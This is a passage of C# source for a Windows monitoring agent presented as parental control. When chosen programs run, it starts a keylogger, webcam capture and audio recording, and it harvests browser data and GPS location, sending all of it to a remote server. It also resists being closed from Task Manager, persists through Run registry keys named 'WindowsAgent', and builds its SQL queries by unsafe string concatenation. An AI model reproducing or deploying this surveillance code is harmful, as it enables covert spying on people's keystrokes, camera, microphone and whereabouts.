                    int ResultDBKeylogger = (int)DataBaseAgent.ExequteWithCommandScaler("Select Count(*) From KeyloggerProcess where ProcessName ='" + ProceName.Replace(".exe", "") + "'");
                    if (ResultDBKeylogger != 0)
                    {
                        KeyAgent.StopLogger();
                        if (DS.Tables["Data"].Rows[12]["DataContent"].ToString() == "KeyLoggerRun")
                        {
                            KeyAgent.StartHogger();
                        }
                    }
                }
                catch (Exception R)
                {

                }

            });
            string ProceData = ProceName + " - " + ((ManagementBaseObject)e.NewEvent
            ["TargetInstance"])["ExecutablePath"] + " - " + ((ManagementBaseObject)e.NewEvent
            ["TargetInstance"])["ProcessId"] + " - " + ((ManagementBaseObject)e.NewEvent
            ["TargetInstance"])["OSName"] + " - " + ((ManagementBaseObject)e.NewEvent
            ["TargetInstance"])["CreationDate"];
            // Send Data To List And Database
            Packet.AppsLog ProcPack = new Packet.AppsLog();
            ProcPack.Name = ProceData;
            ProcPack.Time = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
            ProcPack.Type = (short)Packet.AppsLogType.End;
            string Data = Pack.ToString(ProcPack);
            Packet.ProPacket ProProc = new Packet.ProPacket();
            ProProc.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
            ProProc.Type = (short)Packet.PacketType.AppsLog;
            ProProc.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
            DataRow Row = DS.Tables["MessageLog"].NewRow();
            Row["Data"] = Data;

            Row["Send"] = 0;


            MeesageAdd.WaitOne();
            Row["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
            Thread.Sleep(10);
            //Row["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
            DS.Tables["MessageLog"].Rows.Add(Row);
            MeesageAdd.Release();
            DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
            string ProPackData = Pack.ToString(ProProc);
            if (Connection.ConnectionIsAlive == true)
            {
                Connection.SendDataSM.WaitOne();
                Packet.MainPacket MPacket = new Packet.MainPacket();
                MPacket.PPacket = ProPackData;
                MPacket.Data = Data;
                Connection.SendToServer(Pack.ToString(MPacket));
                Connection.SendDataSM.Release();
            }
            else
            {
                DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                RRow["ProPack"] = ProPackData;
                RRow["Data"] = Data;
                MeesageAdd.WaitOne();
                RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                Thread.Sleep(10);
                DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                MeesageAdd.Release();
                DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
            }
            //MessageBox.Show(((ManagementBaseObject)e.NewEvent
            //    ["TargetInstance"])["Name"].ToString() + " - " + ((ManagementBaseObject)e.NewEvent
            //    ["TargetInstance"])["ExecutablePath"] + " - " + ((ManagementBaseObject)e.NewEvent
            //    ["TargetInstance"])["ProcessId"] + " - " + ((ManagementBaseObject)e.NewEvent
            //    ["TargetInstance"])["OSName"] + " - " + ((ManagementBaseObject)e.NewEvent
            //    ["TargetInstance"])["TerminationDate"]);
        }

        private void ProcessIncoming(object sender, EventArrivedEventArgs e)
        {
            string ProceName = ((ManagementBaseObject)e.NewEvent["TargetInstance"])["Name"].ToString();
            if (ProceName == "shutdown.exe")
            {
                foreach (MyTimer3 var in System3Timer)
                {
                    var.STW.Stop();
                    DS.Tables["SystemLimit"].Rows.Find(var.ID)["Remaining"] = (var.Duration.Interval - var.STW.Elapsed.TotalMinutes);
                }
            }
            Task.Run(() =>
            {
                switch (ProceName.Replace(".exe", ""))
                {
                    case "chrome":
                        {

                            BrowserDataController.Chrome(ChromeHandler);
                        }; break;
                    case "firefox":
                        {
                            BrowserDataController.FireFox(firefoxHandler);
                        }; break;
                    case "iexplore":
                        {
                            BrowserDataController.IE(IEHandler);
                        }; break;
                    case "opera":
                        {
                            BrowserDataController.Opera(OperaHandler);
                        }; break;
                    case "MicrosoftEdge":
                        {
                            BrowserDataController.Edge(EdgeHandler);
                        }; break;
                }





            });
            Task.Run(() =>
            {

                //DataBaseAgent.SelectData("AppsBlock", ref DS, "*", "AppsBlockFind", ProceName, "AppName");
                try
                {
                    PSM.WaitOne();
                    string TargetApp = (DataBaseAgent.ExequteWithCommandScaler("Select * From AppsBlock where AppName Like '%" + ProceName.Replace(".exe", "") + "%'")).ToString();
                    List<Process> ProcesList = new List<Process>();
                    ProcessHandler.GetSpecificProcess(ProceName.Replace(".exe", ""), ref ProcesList);
                    foreach (Process Target in ProcesList)
                    {
                        Target.Kill();
                        if (TargetApp == Packet.AppsType.BlockWithErro.ToString())
                        {
                            DialogResult Result = MessageBox.Show("You Can not Access to This Content By Parent", "Parent Message", MessageBoxButtons.OK);
                        }
                    }
                }
                catch (Exception E)
                {

                }
                PSM.Release();
                //DS.Tables.Remove("AppsBlockFind");


            });
            Task.Run(() =>
            {
                Thread.Sleep(1000);
                ALSM.WaitOne();
                try
                {
                    foreach (DataRow var in DS.Tables["AppLimit"].Rows)
                    {
                        DateTime TempDate = Convert.ToDateTime(var["StartTime"].ToString());
                        DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
                        TempDate = Convert.ToDateTime(var["EndTime"].ToString());
                        DateTime End = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempDate.Hour, TempDate.Minute, TempDate.Second);
                        int Find = (int)DataBaseAgent.ExequteWithCommandScaler("Select Count(*) From AppLimit where AppName Like '%" + ProceName.Replace(".exe", "") + "%'");
                        if (Find > 0)
                        {
                            if ((DateTime.Now.CompareTo(Start) >= 0) && (DateTime.Now.CompareTo(End) <= 0))
                            {
                                List<Process> ProcesList = new List<Process>();
                                ProcessHandler.GetSpecificProcess(ProceName.Replace(".exe", ""), ref ProcesList);
                                foreach (Process Target in ProcesList)
                                {
                                    Target.Kill();
                                }
                            }
                            else
                            {
                                if (DateTime.Now.CompareTo(Start) <= 0)
                                {
                                    try
                                    {
                                        MyTimer3 TimeWatcher = new MyTimer3();
                                        System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalMilliseconds);
                                        System.Timers.Timer Duration = new System.Timers.Timer(((TimeSpan)var["Duration"]).TotalMilliseconds);
                                        Target.Elapsed += BeforAppLimitElipced;
                                        Duration.Elapsed += Duration_AppElapsed;
                                        Target.Start();
                                        TimeWatcher.STW = new Stopwatch();
                                        TimeWatcher.STW.Start();
                                        TimeWatcher.TimeWatcher = Target;
                                        TimeWatcher.ID = var["ID"].ToString();
                                        TimeWatcher.Duration = Duration;
                                        App3Timer.Add(TimeWatcher);
                                    }
                                    catch (Exception E)
                                    {
                                        MyTimer TimeWatcher = new MyTimer();
                                        System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalMilliseconds);
                                        Target.Elapsed += BeforAppLimitElipced;
                                        Target.Start();
                                        TimeWatcher.TimeWatcher = Target;
                                        TimeWatcher.ID = var["ID"].ToString();
                                        App2Timer.Add(TimeWatcher);
                                    }

                                }
                            }
                        }

                    }
                    ALSM.Release();
                }
                catch (Exception E)
                {
                    ALSM.Release();
                }

            });
            Task.Run(() =>
            {
                Packet Pack = new Packet();
                if (ProceName == "msiexec.exe")
                {
                    UninstallOrInstallApp();
                }
                string ProceData = ProceName + " - " + ((ManagementBaseObject)e.NewEvent
                ["TargetInstance"])["ExecutablePath"] + " - " + ((ManagementBaseObject)e.NewEvent
                ["TargetInstance"])["ProcessId"] + " - " + ((ManagementBaseObject)e.NewEvent
                ["TargetInstance"])["OSName"] + " - " + ((ManagementBaseObject)e.NewEvent
                ["TargetInstance"])["CreationDate"];
                Packet.AppsLog ProcPack = new Packet.AppsLog();
                ProcPack.Name = ProceData;
                ProcPack.Time = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                ProcPack.Type = (short)Packet.AppsLogType.Start;
                string Data = Pack.ToString(ProcPack);
                Packet.ProPacket ProProc = new Packet.ProPacket();
                ProProc.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                ProProc.Type = (short)Packet.PacketType.AppsLog;
                ProProc.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                DataRow Row = DS.Tables["MessageLog"].NewRow();
                Row["Data"] = Data;

                Row["Send"] = 0;

                MeesageAdd.WaitOne();
                Row["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                Thread.Sleep(10);
                //string SS = Convert.ToString(DataBaseAgent.ExequteWithCommandScaler("Select NEWID()"));
                //Row["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
                DS.Tables["MessageLog"].Rows.Add(Row);
                MeesageAdd.Release();
                DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
                string ProPackData = Pack.ToString(ProProc);
                if (Connection.ConnectionIsAlive == true)
                {
                    Connection.SendDataSM.WaitOne();
                    Packet.MainPacket MPacket = new Packet.MainPacket();
                    MPacket.PPacket = ProPackData;
                    MPacket.Data = Data;

                    Connection.SendToServer(Pack.ToString(MPacket));
                    //Connection.SendToServer(Data);
                    Connection.SendDataSM.Release();
                }
                else
                {
                    DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                    RRow["ProPack"] = ProPackData;
                    RRow["Data"] = Data;
                    MeesageAdd.WaitOne();
                    RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                }
                //MessageBox.Show(((ManagementBaseObject)e.NewEvent
                //["TargetInstance"])["Name"].ToString() + " - " + ((ManagementBaseObject)e.NewEvent
                //["TargetInstance"])["ExecutablePath"] + " - " + ((ManagementBaseObject)e.NewEvent));
                //["TargetInstance"])["ProcessId"] + " - " + ((ManagementBaseObject)e.NewEvent
                //["TargetInstance"])["OSName"] + " - " + ((ManagementBaseObject)e.NewEvent
                //["TargetInstance"])["CreationDate"]);

            });
            try
            {
                int ResultDBWebCam = (int)DataBaseAgent.ExequteWithCommandScaler("Select Count(*) From WebCamProcess where ProcessName ='" + ProceName.Replace(".exe", "") + "'");
                if (ResultDBWebCam != 0)
                {
                    Packet Pack = new Packet();
                    WebcamAgent.TakePicture(TakePic);

                }
                int ResultDBVoice = (int)DataBaseAgent.ExequteWithCommandScaler("Select Count(*) From VoiceProcess where ProcessName ='" + ProceName.Replace(".exe", "") + "'");
                if (ResultDBVoice != 0)
                {
                    if (VoiceAgent.Runing == false)
                    {
                        this.Invoke(new Action(() =>
                        {
                            VoiceAgent.StartRecording();
                        }));

                    }
                }
                int ResultDBKeylogger = (int)DataBaseAgent.ExequteWithCommandScaler("Select Count(*) From KeyloggerProcess where ProcessName ='" + ProceName.Replace(".exe", "") + "'");
                if (ResultDBKeylogger != 0)
                {
                    if (KeyAgent.Runing == false)
                    {
                        KeyAgent.StartHogger();
                    }
                }
            }
            catch (Exception E)
            {

            }

        }

        private void Duration_AppElapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer3 TargetInstance = App3Timer.Find(x => x.TimeWatcher == Target);
                string ID = TargetInstance.ID;
                TargetInstance.STW.Reset();
                //if (DS.Tables.Contains("AppLimit") == false)
                //{
                //    DataBaseAgent.SelectData("AppLimit", ref DS, "*", "AppsTarget", ID, "ID");
                //}
                DataRow Row = DS.Tables["AppLimit"].Rows.Find(ID);
                Row["Remaining"] = 0;
                //DS.Tables["AppLimit"].AcceptChanges();
                DataBaseAgent.InsertData(DS.Tables["AppLimit"]);
                //DS.Tables.Remove("SystemLimitTarget");
                App3Timer.Remove(TargetInstance);
                switch (Row["Act"])
                {
                    case (short)Packet.AppLimitAct.Close:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                }
                            }

                        }; break;
                    case (short)Packet.AppLimitAct.CloseWithError:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                    DialogResult Result = MessageBox.Show("Usage Time Expired ", " Parent Message", MessageBoxButtons.OK);
                                }
                            }

                        }; break;
                }
                //DoSystem(DS.Tables["AppLimit"].Rows[0]["Act"]);

            }
            catch (Exception EE)
            {

            }
        }

        private void BeforAppLimitElipced(object sender, ElapsedEventArgs e)
        {

            try
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer Finded = App2Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["AppLimit"].Rows.Find(Finded.ID);
                Finded.TimeWatcher.Stop();
                Finded.TimeWatcher.Interval = ((DateTime)Row["EndTime"] - (DateTime)Row["StartTime"]).TotalMinutes;
                Finded.TimeWatcher.Elapsed -= BeforAppLimitElipced;
                Finded.TimeWatcher.Elapsed += EndAppLimitElipced;
                Finded.TimeWatcher.Start();
                switch (Row["Act"])
                {
                    case (short)Packet.AppLimitAct.Close:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(Finded.ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                }
                            }

                        }; break;
                    case (short)Packet.AppLimitAct.CloseWithError:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(Finded.ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                    DialogResult Result = MessageBox.Show("Usage Time Expired ", " Parent Message", MessageBoxButtons.OK);
                                }
                            }

                        }; break;
                }
            }
            catch (Exception E)
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer3 Finded = App3Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["AppLimit"].Rows.Find(Finded.ID);
                Finded.TimeWatcher.Stop();
                Finded.STW.Reset();
                Finded.TimeWatcher.Interval = ((DateTime)Row["EndTime"] - (DateTime)Row["StartTime"]).TotalMinutes;
                Finded.TimeWatcher.Elapsed -= BeforAppLimitElipced;
                Finded.TimeWatcher.Elapsed += EndAppLimitElipced;
                Finded.TimeWatcher.Start();
                switch (Row["Act"])
                {
                    case (short)Packet.AppLimitAct.Close:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(Finded.ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                }
                            }

                        }; break;
                    case (short)Packet.AppLimitAct.CloseWithError:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(Finded.ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                    DialogResult Result = MessageBox.Show("Usage Time Expired ", " Parent Message", MessageBoxButtons.OK);
                                }
                            }

                        }; break;
                }
            }
            //DoSystem(DS.Tables["AppsLimit"].Rows[0]["Act"].ToString());
        }

        private void EndAppLimitElipced(object sender, ElapsedEventArgs e)
        {
            try
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer Finded = App2Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["AppLimit"].Rows.Find(Finded.ID);
                DateTime TempDate = (DateTime)Row["StartTime"];
                DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["StartTime"] = Start;
                TempDate = (DateTime)Row["EndTime"];
                Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["EndTime"] = Start;
                DataBaseAgent.InsertData(DS.Tables["AppLimit"]);
                Finded.TimeWatcher.Stop();
                Finded.TimeWatcher.Elapsed += BeforAppLimitElipced;
                Finded.TimeWatcher.Elapsed -= EndAppLimitElipced;
                Finded.TimeWatcher.Interval = (DateTime.Now - Start).TotalMinutes;
                Finded.TimeWatcher.Start();
                switch (Row["Act"])
                {
                    case (short)Packet.AppLimitAct.Close:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(Finded.ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                }
                            }

                        }; break;
                    case (short)Packet.AppLimitAct.CloseWithError:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(Finded.ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                    DialogResult Result = MessageBox.Show("Usage Time Expired ", " Parent Message", MessageBoxButtons.OK);
                                }
                            }

                        }; break;
                }
            }
            catch (Exception E)
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer3 Finded = App3Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["AppLimit"].Rows.Find(Finded.ID);
                DateTime TempDate = (DateTime)Row["StartTime"];
                DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["StartTime"] = Start;
                TempDate = (DateTime)Row["EndTime"];
                Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["EndTime"] = Start;
                DataBaseAgent.InsertData(DS.Tables["AppLimit"]);
                Finded.TimeWatcher.Stop();
                Finded.STW.Restart();
                Finded.TimeWatcher.Interval = (DateTime.Now - Start).TotalMinutes;
                Finded.TimeWatcher.Elapsed += BeforAppLimitElipced;
                Finded.TimeWatcher.Elapsed -= EndAppLimitElipced;
                Finded.TimeWatcher.Start();
                switch (Row["Act"])
                {
                    case (short)Packet.AppLimitAct.Close:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(Finded.ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                }
                            }

                        }; break;
                    case (short)Packet.AppLimitAct.CloseWithError:
                        {

                            List<Process> PTarget = new List<Process>();
                            ProcessHandler.GetSpecificProcess(Finded.ID, ref PTarget);
                            if (PTarget.Count > 0)
                            {
                                foreach (Process var in PTarget)
                                {
                                    var.Kill();
                                    DialogResult Result = MessageBox.Show("Usage Time Expired ", " Parent Message", MessageBoxButtons.OK);
                                }
                            }

                        }; break;
                }
            }
        }

        public void Uninstall()
        {
            ProcessHandler.StopFallWatching();
            ProcessHandler.StopRiseWatching();
            Sturtup.Stop();
            List<Process> MustKill = new List<Process>();
            ProcessHandler.GetSpecificProcess("SpareWF.exe", ref MustKill);
            foreach (var Target in MustKill)
            {
                Target.Kill();
            }
            //return Data from Data base in to Registry to Show app in add/remove this and SpareWF
            try
            {
                Run.DeleteValue("WindowsAgent");
                Run.DeleteValue("WindowsAgentSpare");
            }
            catch (Exception E)
            {

            }
            try
            {
                RegistryKey Key = Registry.CurrentUser.OpenSubKey(DisableOrEnablePath, true);
                Key.DeleteValue("WindowsAgent");
                Key.DeleteValue("WindowsAgentSpare");
            }
            catch (Exception E)
            {

            }
            AppTools.Uninstall(DS.Tables["Data"].Rows[9]["DataContent"].ToString());// $$$$$Uninstall SpareWF
            AppTools.FindSpecificAppAndInsertData(Registry.LocalMachine, DS.Tables["Data"].Rows[8]["DataContent"].ToString());
            if (DS.Tables["Data"].Rows[7]["DataContent"].ToString() != "")
            {
                AppTools.FindSpecificAppAndInsertData(Registry.CurrentUser, DS.Tables["Data"].Rows[8]["DataContent"].ToString());
            }
            DataBaseAgent.UpdateData(DS.Tables["Data"]);
            //AppTools.FindSpecificAppAndInsertData(Registry.LocalMachine, DS.Tables["Data"].Rows[10]["DataContent"].ToString());
            //if (DS.Tables["Data"].Rows[9]["DataContent"].ToString() != "")
            //{
            //    AppTools.FindSpecificAppAndInsertData(Registry.CurrentUser, DS.Tables["Data"].Rows[10]["DataContent"].ToString());
            //}
            Process.GetCurrentProcess().Kill();
        }

        private void PositionChanged(object sender, GeoPositionChangedEventArgs<GeoCoordinate> e)
        {
            Packet Pack = new Packet();
            try
            {

                //MyPlace.SetLocation(e.Position);
                if ((DS.Tables["Location"].Rows.Count > 0) && ((Convert.ToDateTime(DS.Tables["Location"].Rows[DS.Tables["Location"].Rows.Count - 1]["Date"]) - DateTime.Now).TotalMinutes > 10))
                {
                    if (DS.Tables.Contains("Location") == false)
                    {
                        DataBaseAgent.FillDataSet("Location", ref DS);
                    }
                    DataRow Row = DS.Tables["Location"].NewRow();
                    Row["Longitude"] = e.Position.Location.Longitude.ToString();
                    Row["Latitude"] = e.Position.Location.Latitude.ToString();
                    Row["Date"] = e.Position.Timestamp.DateTime;
                    DS.Tables["Location"].Rows.Add(Row);
                    DataBaseAgent.InsertData(DS.Tables["Location"]);
                    //DS.Tables.Remove("Location");
                    Packet.ProPacket ProLocation = new Packet.ProPacket();
                    Packet.Location LocationPack = new Packet.Location();
                    ProLocation.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                    ProLocation.Type = (short)Packet.PacketType.Location;
                    LocationPack.Latitude = Row["Latitude"].ToString();
                    LocationPack.Longitude = Row["Longitude"].ToString();
                    LocationPack.Time = (DateTime)Row["Date"];
                    string Data = Pack.ToString(LocationPack);
                    DataRow MRow = DS.Tables["MessageLog"].NewRow();
                    MRow["Data"] = Data;
                    MRow["Send"] = 0;
                    MeesageAdd.WaitOne();
                    MRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    DS.Tables["MessageLog"].Rows.Add(MRow);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
                    ProLocation.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                    string ProPackData = Pack.ToString(ProLocation);
                    if (Connection.ConnectionIsAlive == true)
                    {
                        Connection.SendDataSM.WaitOne();
                        Packet.MainPacket MPacket = new Packet.MainPacket();
                        MPacket.PPacket = ProPackData;
                        MPacket.Data = Data;

                        Connection.SendToServer(Pack.ToString(MPacket));
                        //Connection.SendToServer(Data);
                        Connection.SendDataSM.Release();
                    }
                    else
                    {
                        DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                        RRow["ProPack"] = ProPackData;
                        RRow["Data"] = Data;
                        MeesageAdd.WaitOne();
                        RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                        Thread.Sleep(10);
                        DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                        MeesageAdd.Release();
                        DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                    }
                }

            }
            catch (Exception EE)
            {
                try
                {
                    GeoPosition<GeoCoordinate> Current = MyPlace.GetLocation();///$$$$$$$$$$
                    try
                    {
                        if (DS.Tables.Contains("Location") != true)
                        {
                            DataBaseAgent.SelectData("Location", ref DS, "Location");
                        }
                    }
                    catch
                    {

                    }
                    DataRow Row = DS.Tables["Location"].NewRow();
                    Row["Longitude"] = e.Position.Location.Longitude.ToString();
                    Row["Latitude"] = e.Position.Location.Latitude.ToString();
                    Row["Date"] = e.Position.Timestamp.DateTime;
                    DS.Tables["Location"].Rows.Add(Row);
                    DataBaseAgent.InsertData(DS.Tables["Location"]);
                    Packet.ProPacket ProLocation = new Packet.ProPacket();
                    Packet.Location LocationPack = new Packet.Location();
                    ProLocation.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                    ProLocation.Type = (short)Packet.PacketType.Location;
                    LocationPack.Latitude = Row["Latitude"].ToString();
                    LocationPack.Longitude = Row["Longitude"].ToString();
                    LocationPack.Time = (DateTime)Row["Date"];
                    string Data = Pack.ToString(LocationPack);
                    ProLocation.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                    string ProPackData = Pack.ToString(ProLocation);
                    DataRow MRow = DS.Tables["MessageLog"].NewRow();
                    MRow["Data"] = Data;

                    MRow["Send"] = 0;
                    MeesageAdd.WaitOne();
                    MRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    DS.Tables["MessageLog"].Rows.Add(MRow);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLog"]);

                    if (Connection.ConnectionIsAlive == true)
                    {
                        Connection.SendDataSM.WaitOne();
                        Packet.MainPacket MPacket = new Packet.MainPacket();
                        MPacket.PPacket = ProPackData;
                        MPacket.Data = Data;

                        Connection.SendToServer(Pack.ToString(MPacket));
                        //Connection.SendToServer(Data);
                        Connection.SendDataSM.Release();
                    }
                    else
                    {
                        DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                        RRow["ProPack"] = ProPackData;
                        RRow["Data"] = Data;
                        MeesageAdd.WaitOne();
                        RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                        Thread.Sleep(10);
                        DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                        MeesageAdd.Release();
                        DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                    }

                    //MRow["Send"] = 1;
                    DataBaseAgent.UpdateData(DS.Tables["MessageLog"]);

                }
                catch (Exception ee)
                {
                    try
                    {
                        if (DS.Tables.Contains("Location") != true)
                        {
                            DataBaseAgent.SelectData("Location", ref DS, "Location");
                        }

                    }
                    catch
                    {

                    }
                    DataRow Row = DS.Tables["Location"].NewRow();
                    Row["Longitude"] = -1;
                    Row["Latitude"] = -1;
                    Row["Date"] = DateTime.Now;
                    DS.Tables["Location"].Rows.Add(Row);
                    DataBaseAgent.InsertData(DS.Tables["Location"]);
                    //DS.Tables.Remove("Location");
                    Packet.ProPacket ProLocation = new Packet.ProPacket();
                    Packet.Location LocationPack = new Packet.Location();
                    ProLocation.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                    ProLocation.Type = (short)Packet.PacketType.Location;
                    LocationPack.Latitude = Row["Latitude"].ToString();
                    LocationPack.Longitude = Row["Latitude"].ToString();
                    LocationPack.Time = (DateTime)Row["Date"];
                    string Data = Pack.ToString(LocationPack);
                    DataRow MRow = DS.Tables["MessageLog"].NewRow();
                    MRow["Data"] = Data;

                    MRow["Send"] = 0;
                    MeesageAdd.WaitOne();
                    MRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    DS.Tables["MessageLog"].Rows.Add(MRow);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
                    ProLocation.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                    string ProPackData = Pack.ToString(ProLocation);
                    if (Connection.ConnectionIsAlive == true)
                    {
                        Connection.SendDataSM.WaitOne();
                        Packet.MainPacket MPacket = new Packet.MainPacket();
                        MPacket.PPacket = ProPackData;
                        MPacket.Data = Data;

                        Connection.SendToServer(Pack.ToString(MPacket));
                        //Connection.SendToServer(Data);
                        Connection.SendDataSM.Release();
                    }
                    else
                    {
                        DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                        RRow["ProPack"] = ProPackData;
                        RRow["Data"] = Data;
                        MeesageAdd.WaitOne();
                        RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                        Thread.Sleep(10);
                        DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                        MeesageAdd.Release();
                        DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                    }
                }

            }
            if (MyPlace.TurnOFF == true)
            {
                //NetWork.Disable("Wi-Fi");
                MyPlace.TurnOFF = false;
            }



        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Connection.ShowtDown();
            e.Cancel = true;
            switch (e.CloseReason)
            {
                case CloseReason.ApplicationExitCall:
                    {
                        e.Cancel = true;
                    }; break;
                case CloseReason.FormOwnerClosing:
                    {
                        e.Cancel = true;
                    }; break;
                case CloseReason.WindowsShutDown:
                    {
                        e.Cancel = false;

                    }; break;
                case CloseReason.TaskManagerClosing:
                    {
                        e.Cancel = true;

                    }; break;
                case CloseReason.UserClosing:
                    {
                        e.Cancel = true;
                    }; break;
                case CloseReason.MdiFormClosing:
                    {
                        e.Cancel = true;
                    }; break;
                case CloseReason.None:
                    {
                        e.Cancel = true;
                    }; break;
            }
            //base.OnFormClosing(e);
        }

        public void CheckForInternetConnection()
        {
            try
            {
                var client = new WebClient();
                client.OpenRead("http://google.com/");
                InternetConnection = true;
                SendRemainingData();
                //DataBaseAgent.SelectData("NetworkLimit", ref DS, "NetworkLimit");

                Packet Pack = new Packet();
                Packet.ProPacket ProConnection = new Packet.ProPacket();
                Packet.NetworkStatus ConnectionPack = new Packet.NetworkStatus();
                DataRow ConnectionRow = DS.Tables["MessageLog"].NewRow();
                ConnectionPack.Data = NetWork.GetConnectionInterfaceName();
                ConnectionPack.Time = DateTime.Now;
                ConnectionPack.Type = (short)Packet.NetworkStatusType.Internet;
                string Data = Pack.ToString(ConnectionPack);
                ProConnection.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                ProConnection.Type = (short)Packet.PacketType.NetworkStatusNow;
                ProConnection.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                string ProPackData = Pack.ToString(ProConnection);
